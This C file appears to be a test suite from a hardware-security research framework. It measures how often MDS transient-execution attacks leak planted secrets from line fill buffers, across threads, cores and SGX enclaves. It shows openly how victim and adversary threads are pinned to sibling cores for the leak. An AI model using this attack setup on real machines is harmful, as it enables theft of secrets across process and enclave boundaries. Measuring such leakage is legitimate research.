#include "enclyser/app/mds.h"

#pragma region msd

TestSuite(mds, .init = construct_app_environment,
          .fini = destruct_app_environment, .disabled = true);

#pragma region mds_st_nosgx

int fn_mds_st_nosgx(char *extra_settings) {
  // SET CPU AFFINITY
  int core = 1;
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET((size_t)core, &cpuset);
  ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    attack_spec.offset = offset;
    for (int i = 0; i < REPETITION_TIME; i++) {
      fill_lfb(*filling_sequence, filling_buffer);
      flush_buffer(&app_encoding_buffer);
      attack(&attack_spec, attacking_buffer, &app_encoding_buffer);
      reload(&app_encoding_buffer, &app_printing_buffer);
    }
    accum += app_printing_buffer.buffer[offset + filling_buffer->value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("MDS ST NOSGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(mds, mds_st_nosgx, .disabled = false) {
  attack_spec.major = ATTACK_MAJOR_MDS;
  attack_spec.minor = ATTACK_MINOR_STABLE;

  filling_sequence = &app_filling_sequence;
  filling_buffer = &app_filling_buffer;
  attacking_buffer = &app_attacking_buffer;

  filling_buffer->value = 0x1;
  filling_buffer->order = BUFFER_ORDER_OFFSET_INLINE;
  assign_buffer(filling_buffer);

  // IMPORTANT: MUST BE NON-ZERO VALUE
  app_attacking_buffer.value = 0xff;
  app_attacking_buffer.order = BUFFER_ORDER_CONSTANT;
  assign_buffer(&app_attacking_buffer);
  
  app_attacking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&app_attacking_buffer);

  *filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_mds_st_nosgx("GP_LOAD 0x1") == 0);

  *filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_mds_st_nosgx("GP_STORE 0x1") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_mds_st_nosgx("NT_LOAD 0x1") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_mds_st_nosgx("NT_STORE 0x1") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_mds_st_nosgx("STR_LOAD 0x1") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_mds_st_nosgx("STR_STORE 0x1") == 0);
}

#pragma endregion

#pragma region mds_st_sgx

int fn_mds_st_sgx(char *extra_settings) {
  // SET CPU AFFINITY
  int core = 1;
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET((size_t)core, &cpuset);
  ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    attack_spec.offset = offset;
    for (int i = 0; i < REPETITION_TIME; i++) {
      ecall_fill_lfb(global_eid, *filling_sequence, filling_buffer);
      flush_buffer(&app_encoding_buffer);
      attack(&attack_spec, attacking_buffer, &app_encoding_buffer);
      reload(&app_encoding_buffer, &app_printing_buffer);
    }
    accum += app_printing_buffer.buffer[offset + filling_buffer->value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("MDS ST SGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(mds, mds_st_sgx, .disabled = false) {
  attack_spec.major = ATTACK_MAJOR_MDS;
  attack_spec.minor = ATTACK_MINOR_STABLE;

  filling_sequence = &enclave_filling_sequence;
  filling_buffer = &encalve_secret_buffer;
  attacking_buffer = &app_attacking_buffer;

  filling_buffer->value = 0x21;
  filling_buffer->order = BUFFER_ORDER_OFFSET_INLINE;
  ecall_assign_secret(global_eid, filling_buffer);

  // IMPORTANT: MUST BE NON-ZERO VALUE
  app_attacking_buffer.value = 0xff;
  app_attacking_buffer.order = BUFFER_ORDER_CONSTANT;
  assign_buffer(&app_attacking_buffer);

  app_attacking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&app_attacking_buffer);

  *filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_mds_st_sgx("GP_LOAD 0x21") == 0);

  *filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_mds_st_sgx("GP_STORE 0x21") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_mds_st_sgx("NT_LOAD 0x21") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_mds_st_sgx("NT_STORE 0x21") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_mds_st_sgx("STR_LOAD 0x21") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_mds_st_sgx("STR_STORE 0x21") == 0);
}

#pragma endregion

#pragma region mds_ct_nosgx

void *victhrd_mds_ct_nosgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME * 100; i++) {
    fill_lfb(*filling_sequence, filling_buffer);
  }

  return NULL;
}

void *attthrd_mds_ct_nosgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME; i++) {
    flush_buffer(&app_encoding_buffer);
    attack(&attack_spec, attacking_buffer, &app_encoding_buffer);
    reload(&app_encoding_buffer, &app_printing_buffer);
  }

  return NULL;
}

int fn_mds_ct_nosgx(char *extra_settings) {
  // SET CPU AFFINITY
  int victim_core = 1;
  int adversary_core = victim_core + sysinfo.nr_cores;
  pthread_t victim_thread, adversary_thread;
  cpu_set_t victim_cpuset, adversary_cpuset;
  CPU_ZERO(&victim_cpuset);
  CPU_ZERO(&adversary_cpuset);
  CPU_SET((size_t)victim_core, &victim_cpuset);
  CPU_SET((size_t)adversary_core, &adversary_cpuset);

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    attack_spec.offset = offset;

    ASSERT(!pthread_create(&victim_thread, NULL, victhrd_mds_ct_nosgx, NULL));
    ASSERT(
        !pthread_create(&adversary_thread, NULL, attthrd_mds_ct_nosgx, NULL));

    ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t),
                                   &victim_cpuset));
    ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t),
                                   &adversary_cpuset));

    pthread_join(adversary_thread, NULL);
    pthread_join(victim_thread, NULL);

    accum += app_printing_buffer.buffer[offset + filling_buffer->value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("MDS CT NOSGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(mds, mds_ct_nosgx, .disabled = false) {
  attack_spec.major = ATTACK_MAJOR_MDS;
  attack_spec.minor = ATTACK_MINOR_STABLE;

  filling_sequence = &app_filling_sequence;
  filling_buffer = &app_filling_buffer;
  attacking_buffer = &app_attacking_buffer;

  filling_buffer->value = 0x41;
  filling_buffer->order = BUFFER_ORDER_OFFSET_INLINE;
  assign_buffer(filling_buffer);

  // IMPORTANT: MUST BE NON-ZERO VALUE
  app_attacking_buffer.value = 0xff;
  app_attacking_buffer.order = BUFFER_ORDER_CONSTANT;
  assign_buffer(&app_attacking_buffer);
  
  app_attacking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&app_attacking_buffer);

  *filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_mds_ct_nosgx("GP_LOAD 0x41") == 0);

  *filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_mds_ct_nosgx("GP_STORE 0x41") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_mds_ct_nosgx("NT_LOAD 0x41") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_mds_ct_nosgx("NT_STORE 0x41") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_mds_ct_nosgx("STR_LOAD 0x41") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_mds_ct_nosgx("STR_STORE 0x41") == 0);
}

#pragma endregion

#pragma region mds_ct_sgx

void *victhrd_mds_ct_sgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME * 100; i++) {
    ecall_fill_lfb(global_eid, *filling_sequence, filling_buffer);
  }

  return NULL;
}

void *attthrd_mds_ct_sgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME; i++) {
    flush_buffer(&app_encoding_buffer);
    attack(&attack_spec, attacking_buffer, &app_encoding_buffer);
    reload(&app_encoding_buffer, &app_printing_buffer);
  }

  return NULL;
}

int fn_mds_ct_sgx(char *extra_settings) {
  // SET CPU AFFINITY
  int victim_core = 1;
  int adversary_core = victim_core + sysinfo.nr_cores;
  pthread_t victim_thread, adversary_thread;
  cpu_set_t victim_cpuset, adversary_cpuset;
  CPU_ZERO(&victim_cpuset);
  CPU_ZERO(&adversary_cpuset);
  CPU_SET((size_t)victim_core, &victim_cpuset);
  CPU_SET((size_t)adversary_core, &adversary_cpuset);

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    attack_spec.offset = offset;

    ASSERT(!pthread_create(&victim_thread, NULL, victhrd_mds_ct_sgx, NULL));
    ASSERT(!pthread_create(&adversary_thread, NULL, attthrd_mds_ct_sgx, NULL));

    ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t),
                                   &victim_cpuset));
    ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t),
                                   &adversary_cpuset));

    pthread_join(adversary_thread, NULL);
    pthread_join(victim_thread, NULL);

    accum += app_printing_buffer.buffer[offset + filling_buffer->value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("MDS CT SGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(mds, mds_ct_sgx, .disabled = false) {
  attack_spec.major = ATTACK_MAJOR_MDS;
  attack_spec.minor = ATTACK_MINOR_STABLE;

  filling_sequence = &enclave_filling_sequence;
  filling_buffer = &encalve_secret_buffer;
  attacking_buffer = &app_attacking_buffer;

  filling_buffer->value = 0x61;
  filling_buffer->order = BUFFER_ORDER_OFFSET_INLINE;
  ecall_assign_secret(global_eid, filling_buffer);

  // IMPORTANT: MUST BE NON-ZERO VALUE
  app_attacking_buffer.value = 0xff;
  app_attacking_buffer.order = BUFFER_ORDER_CONSTANT;
  assign_buffer(&app_attacking_buffer);

  app_attacking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&app_attacking_buffer);

  *filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_mds_ct_sgx("GP_LOAD 0x61") == 0);

  *filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_mds_ct_sgx("GP_STORE 0x61") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_mds_ct_sgx("NT_LOAD 0x61") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_mds_ct_sgx("NT_STORE 0x61") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_mds_ct_sgx("STR_LOAD 0x61") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_mds_ct_sgx("STR_STORE 0x61") == 0);
}

#pragma endregion

#pragma region mds_cc_nosgx

void *victhrd_mds_cc_nosgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME * 100; i++) {
    fill_lfb(*filling_sequence, filling_buffer);
  }

  return NULL;
}

void *attthrd_mds_cc_nosgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME; i++) {
    flush_buffer(&app_encoding_buffer);
    attack(&attack_spec, attacking_buffer, &app_encoding_buffer);
    reload(&app_encoding_buffer, &app_printing_buffer);
  }

  return NULL;
}

int fn_mds_cc_nosgx(char *extra_settings) {
  // SET CPU AFFINITY
  int victim_core = 1;
  int adversary_core = victim_core + sysinfo.nr_cores - 1;
  pthread_t victim_thread, adversary_thread;
  cpu_set_t victim_cpuset, adversary_cpuset;
  CPU_ZERO(&victim_cpuset);
  CPU_ZERO(&adversary_cpuset);
  CPU_SET((size_t)victim_core, &victim_cpuset);
  CPU_SET((size_t)adversary_core, &adversary_cpuset);

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    attack_spec.offset = offset;

    ASSERT(!pthread_create(&victim_thread, NULL, victhrd_mds_cc_nosgx, NULL));
    ASSERT(
        !pthread_create(&adversary_thread, NULL, attthrd_mds_cc_nosgx, NULL));

    ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t),
                                   &victim_cpuset));
    ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t),
                                   &adversary_cpuset));

    pthread_join(adversary_thread, NULL);
    pthread_join(victim_thread, NULL);

    accum += app_printing_buffer.buffer[offset + filling_buffer->value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("MDS CC NOSGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(mds, mds_cc_nosgx, .disabled = false) {
  attack_spec.major = ATTACK_MAJOR_MDS;
  attack_spec.minor = ATTACK_MINOR_STABLE;

  filling_sequence = &app_filling_sequence;
  filling_buffer = &app_filling_buffer;
  attacking_buffer = &app_attacking_buffer;

  filling_buffer->value = 0x81;
  filling_buffer->order = BUFFER_ORDER_OFFSET_INLINE;
  assign_buffer(filling_buffer);

  // IMPORTANT: MUST BE NON-ZERO VALUE
  app_attacking_buffer.value = 0xff;
  app_attacking_buffer.order = BUFFER_ORDER_CONSTANT;
  assign_buffer(&app_attacking_buffer);

  app_attacking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&app_attacking_buffer);

  *filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_mds_cc_nosgx("GP_LOAD 0x81") == 0);

  *filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_mds_cc_nosgx("GP_STORE 0x81") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_mds_cc_nosgx("NT_LOAD 0x81") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_mds_cc_nosgx("NT_STORE 0x81") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_mds_cc_nosgx("STR_LOAD 0x81") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_mds_cc_nosgx("STR_STORE 0x81") == 0);
}

#pragma endregion

#pragma region mds_cc_sgx

void *victhrd_mds_cc_sgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME * 100; i++) {
    ecall_fill_lfb(global_eid, *filling_sequence, filling_buffer);
  }

  return NULL;
}

void *attthrd_mds_cc_sgx(void *arg) {
  // BYPASS THE WARNING ABOUT UNSED PARAMETER
  (void)arg;

  for (int i = 0; i < REPETITION_TIME; i++) {
    flush_buffer(&app_encoding_buffer);
    attack(&attack_spec, attacking_buffer, &app_encoding_buffer);
    reload(&app_encoding_buffer, &app_printing_buffer);
  }

  return NULL;
}

int fn_mds_cc_sgx(char *extra_settings) {
  // SET CPU AFFINITY
  int victim_core = 1;
  int adversary_core = victim_core + sysinfo.nr_cores - 1;
  pthread_t victim_thread, adversary_thread;
  cpu_set_t victim_cpuset, adversary_cpuset;
  CPU_ZERO(&victim_cpuset);
  CPU_ZERO(&adversary_cpuset);
  CPU_SET((size_t)victim_core, &victim_cpuset);
  CPU_SET((size_t)adversary_core, &adversary_cpuset);

  // CALCULATE SUCCESS RATE
  int accum = 0;
  for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
    attack_spec.offset = offset;

    ASSERT(!pthread_create(&victim_thread, NULL, victhrd_mds_cc_sgx, NULL));
    ASSERT(!pthread_create(&adversary_thread, NULL, attthrd_mds_cc_sgx, NULL));

    ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t),
                                   &victim_cpuset));
    ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t),
                                   &adversary_cpuset));

    pthread_join(adversary_thread, NULL);
    pthread_join(victim_thread, NULL);

    accum += app_printing_buffer.buffer[offset + filling_buffer->value];
    reset(&app_printing_buffer);
  }
  double success_rate = ((double)accum) / CACHELINE_SIZE / REPETITION_TIME;
  cr_log_warn("MDS CC SGX %s: %f %%", extra_settings, success_rate * 100);

  return 0;
}

Test(mds, mds_cc_sgx, .disabled = false) {
  attack_spec.major = ATTACK_MAJOR_MDS;
  attack_spec.minor = ATTACK_MINOR_STABLE;

  filling_sequence = &enclave_filling_sequence;
  filling_buffer = &encalve_secret_buffer;
  attacking_buffer = &app_attacking_buffer;

  filling_buffer->value = 0xa1;
  filling_buffer->order = BUFFER_ORDER_OFFSET_INLINE;
  ecall_assign_secret(global_eid, filling_buffer);

  // IMPORTANT: MUST BE NON-ZERO VALUE
  app_attacking_buffer.value = 0xff;
  app_attacking_buffer.order = BUFFER_ORDER_CONSTANT;
  assign_buffer(&app_attacking_buffer);

  app_attacking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
  cripple_buffer(&app_attacking_buffer);

  *filling_sequence = FILLING_SEQUENCE_GP_LOAD;
  cr_expect(fn_mds_cc_sgx("GP_LOAD 0xa1") == 0);

  *filling_sequence = FILLING_SEQUENCE_GP_STORE;
  cr_expect(fn_mds_cc_sgx("GP_STORE 0xa1") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_LOAD;
  cr_expect(fn_mds_cc_sgx("NT_LOAD 0xa1") == 0);

  *filling_sequence = FILLING_SEQUENCE_NT_STORE;
  cr_expect(fn_mds_cc_sgx("NT_STORE 0xa1") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_LOAD;
  cr_expect(fn_mds_cc_sgx("STR_LOAD 0xa1") == 0);

  *filling_sequence = FILLING_SEQUENCE_STR_STORE;
  cr_expect(fn_mds_cc_sgx("STR_STORE 0xa1") == 0);
}

#pragma endregion

#pragma endregion
